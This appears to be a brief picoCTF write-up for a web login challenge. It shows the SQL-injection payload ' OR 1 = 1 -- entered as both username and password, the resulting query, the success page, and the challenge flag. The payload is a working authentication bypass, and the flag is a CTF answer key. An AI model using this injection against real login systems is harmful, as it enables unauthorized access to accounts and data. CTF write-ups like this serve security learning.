USE SQL-injection payload list

to attack

Read at README.md

we found that:::

Username: ' OR 1 = 1 -- 
Password: ' OR 1 = 1 -- 


===> for first we check at the wrong username and password

So read from .php file

view-source:http://saturn.picoctf.net:62974/login.php

<pre>username: &#039; OR 1 = 1 -- 
password: &#039; OR 1 = 1 -- 
SQL query: SELECT * FROM users WHERE name=&#039;&#039; OR 1 = 1 -- &#039; AND password=&#039;&#039; OR 1 = 1 -- &#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>